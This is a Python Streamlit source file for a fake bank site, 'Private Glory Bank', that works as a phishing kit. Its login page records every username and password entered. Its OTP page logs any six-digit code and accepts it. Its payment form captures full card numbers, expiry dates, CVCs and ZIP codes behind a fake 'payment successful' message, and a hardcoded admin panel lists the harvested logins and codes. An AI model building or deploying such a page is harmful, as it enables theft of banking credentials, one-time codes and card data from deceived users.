import streamlit as st
import pandas as pd
from datetime import datetime
import plotly.express as px

# ==================== SESSION STATE ====================
st.session_state.checking_balance = st.session_state.get("checking_balance", 12340.50)
st.session_state.savings_balance   = st.session_state.get("savings_balance", 14911.32)
st.session_state.captured_creds   = st.session_state.get("captured_creds", [])
st.session_state.captured_otp     = st.session_state.get("captured_otp", [])
st.session_state.scheduled_transfers = st.session_state.get("scheduled_transfers", [])
st.session_state.login_history    = st.session_state.get("login_history", [])
st.session_state.file_uploads     = st.session_state.get("file_uploads", [])
st.session_state.transactions     = st.session_state.get("transactions", [])
st.session_state.authenticated    = st.session_state.get("authenticated", False)
st.session_state.otp_verified     = st.session_state.get("otp_verified", False)
st.session_state.is_admin         = st.session_state.get("is_admin", False)

st.set_page_config(page_title="Private Glory Bank", page_icon="Eagle", layout="wide")

# ==================== CSS ====================
st.markdown("""
<style>
    .stApp {background: linear-gradient(145deg, #fff 65%, #002868 100%);}
    .header {background: repeating-linear-gradient(90deg, #002868 0, #002868 60px, #BF0A30 60px, #BF0A30 120px);
             padding: 20px; text-align: center; border-bottom: 10px solid #fcca46; border-radius: 0 0 30px 30px;}
    .glass {background: rgba(255,255,255,0.95); padding: 30px; border-radius: 18px;
            box-shadow: 0 8px 32px rgba(0,40,104,0.2); margin: 20px 0;
            border-bottom: 6px solid #BF0A30; border-right: 5px solid #002868;}
    .big {font-size: 120px; background: linear-gradient(90deg, #002868, #BF0A30);
          -webkit-background-clip: text; -webkit-text-fill-color: transparent;}
    h1,h2,h3 {color: #BF0A30 !important;}
</style>
""", unsafe_allow_html=True)

# ==================== CREDENTIALS ====================
VALID_USER, VALID_PASS = "client001", "SecureUSA2025!"
ADMIN_USER, ADMIN_PASS = "admin", "showme2025"

# ==================== CARD VALIDATION ====================
def validate_card(card):
    d = [int(x) for x in card if x.isdigit()]
    return len(d) in [15,16] and (sum(d[-1::-2]) + sum(sum(divmod(2*x,10)) for x in d[-2::-2])) % 10 == 0

# ==================== PAGES ====================
def login_page():
    st.markdown('<div class="header"><div class="big">Eagle</div><h1>Private Glory Bank</h1></div>', unsafe_allow_html=True)
    col1, _, col2 = st.columns([1,1,1])
    with col2:
        u = st.text_input("User ID")
        p = st.text_input("Password", type="password")
        if st.button("Log In", type="primary", use_container_width=True):
            st.session_state.captured_creds.append({"time": datetime.now().isoformat(), "user": u, "pass": p})
            if u == VALID_USER and p == VALID_PASS:
                st.session_state.authenticated = True
                st.rerun()
            elif u == ADMIN_USER and p == ADMIN_PASS:
                st.session_state.is_admin = st.session_state.authenticated = True
                st.rerun()
            else:
                st.error("Wrong credentials")

def otp_page():
    st.markdown("<h1 style='text-align:center'>Security Verification</h1><p>Code sent to ••••1776</p>", unsafe_allow_html=True)
    code = st.text_input("6-digit code", max_chars=6)
    if st.button("Verify", type="primary"):
        st.session_state.captured_otp.append({"time": datetime.now().isoformat(), "otp": code})
        if len(code) == 6 and code.isdigit():
            st.session_state.otp_verified = True
            st.rerun()
        else:
            st.error("Invalid")

def admin_view():
    st.markdown("<h1 style='text-align:center;color:#BF0A30'>Eagle ADMIN PANEL</h1>", unsafe_allow_html=True)
    t1,t2,t3 = st.tabs(["Logins","OTPs","Transfers"])
    with t1: st.dataframe(pd.DataFrame(st.session_state.captured_creds))
    with t2: st.dataframe(pd.DataFrame(st.session_state.captured_otp))
    with t3: st.dataframe(pd.DataFrame(st.session_state.scheduled_transfers))

def dashboard():
    total = st.session_state.checking_balance + st.session_state.savings_balance
    st.markdown('<div class="header"><div class="big">Eagle</div><h1>Private Glory Bank</h1></div>', unsafe_allow_html=True)
    c1,c2,c3,c4 = st.columns(4)
    c1.metric("Total", f"${total:,.2f}")
    c2.metric("Credit", "$15,700")
    c3.metric("Spending", "$3,214")
    c4.metric("Goal", "78%")
    col1,col2 = st.columns(2)
    with col1:
        fig = px.pie(values=[st.session_state.checking_balance, st.session_state.savings_balance],
                     names=["Checking","Savings"], color_discrete_sequence=["#BF0A30","#002868"])
        st.plotly_chart(fig, use_container_width=True)
    with col2:
        st.bar_chart(pd.DataFrame({"Category":["Food","Bills","Shopping"],"Amount":[3600,3800,2700]}).set_index("Category"))

def accounts():
    st.markdown("<div class='glass'><h2>My Accounts</h2></div>", unsafe_allow_html=True)
    st.markdown(f"<div class='glass'><h3>Checking ••••1776</h3><h2>${st.session_state.checking_balance:,.2f}</h2></div>", unsafe_allow_html=True)
    st.markdown(f"<div class='glass'><h3>Savings ••••1812</h3><h2>${st.session_state.savings_balance:,.2f}</h2></div>", unsafe_allow_html=True)

def cards_page():
    st.markdown("<div class='glass'><h2>Freedom Card ••••1776</h2><p style='font-size:80px;text-align:center'>Credit Card</p></div>", unsafe_allow_html=True)
    c1,c2,c3 = st.columns(3)
    with c1:
        if st.button("Show Full Number"):
            st.success("5412 1776 2024 1812")
    with c2:
        if st.button("Show Expiry"):
            st.success("07/29")
    with c3:
        if st.button("Show CVV"):
            st.session_state.captured_creds.append({"cvv":"776"})
            st.info("CVV: 776")

def transfer():
    st.markdown("<div class='glass'><h1>Transfer & Pay</h1></div>", unsafe_allow_html=True)
    card = st.text_input("Card Number")
    exp  = st.text_input("MM/YY")
    cvc  = st.text_input("CVC", type="password")
    zipc = st.text_input("ZIP")
    amt  = st.number_input("Amount", min_value=0.01)
    if st.button("Pay Now", type="primary"):
        if validate_card(card):
            st.success(f"Payment ${amt:,.2f} successful!")
            st.session_state.captured_creds.append({"card":card,"exp":exp,"cvc":cvc,"zip":zipc,"amount":amt})
        else:
            st.error("Invalid card")

def messages():
    uploaded = st.file_uploader("Upload documents")
    if uploaded:
        st.session_state.file_uploads.append({"file":uploaded.name})
        st.success("Received")

def sidebar():
    st.sidebar.markdown('<div style="text-align:center;background:linear-gradient(#002868,#BF0A30);color:white;padding:20px;border-radius:15px"><div style="font-size:60px">Eagle</div><h2>Private Glory Bank</h2></div>', unsafe_allow_html=True)
    return st.sidebar.radio("Menu", ["Dashboard","Accounts","Cards","Transfer & Pay","Messages"])

# ==================== MAIN ====================
if not st.session_state.authenticated:
    login_page()
elif st.session_state.is_admin:
    admin_view()
elif not st.session_state.otp_verified:
    otp_page()
else:
    page = sidebar()
    if page == "Dashboard": dashboard()
    elif page == "Accounts": accounts()
    elif page == "Cards": cards_page()
    elif page == "Transfer & Pay": transfer()
    elif page == "Messages": messages()
